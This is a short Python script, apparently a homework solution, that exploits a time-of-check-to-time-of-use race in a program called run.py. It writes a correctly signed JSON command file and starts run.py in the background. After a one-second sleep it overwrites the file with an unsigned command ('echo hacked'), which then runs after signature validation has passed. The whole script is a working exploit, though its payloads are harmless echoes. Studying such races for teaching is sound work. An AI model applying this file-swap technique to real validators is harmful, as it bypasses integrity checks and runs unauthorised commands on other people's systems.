import json, subprocess, time


SIGNATURE = "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"
PATH_TO_FOO = r"./q5/foo"
PATH_TO_RUN = r"./q5/run.py"


def write_correct_data(command, signature):
    """Writing a file containg a json with command and signature as keys"""
    # This file will be used to pass the validation

    with open(PATH_TO_FOO, "w") as write_file:
        json.dump({"command": command, "signature": signature}, write_file)

def write_exploit_data(command):
    """Writing a file containg a json with command as key"""
    # This file will be used after the validation, the exploit

    with open(PATH_TO_FOO, "w") as write_file:
        json.dump({"command": command}, write_file)


def time_of_wait_to_time_of_use():
    time.sleep(1)


def main():

    # Writing a file which is identical to example.json so it will pass validation
    write_correct_data(command="echo cool", signature=SIGNATURE)

    # Calling run.py and let it run in the background
    proc = subprocess.Popen(["python", PATH_TO_RUN, PATH_TO_FOO])

    # Exploiting:
    # Waiting for one second to be sure the validation already started
    time_of_wait_to_time_of_use()

    # Changing the file to contain echo hacked as a command
    write_exploit_data(command="echo hacked")

    proc.communicate()  #  In charge of asynchrounius running


if __name__ == '__main__':
    main()
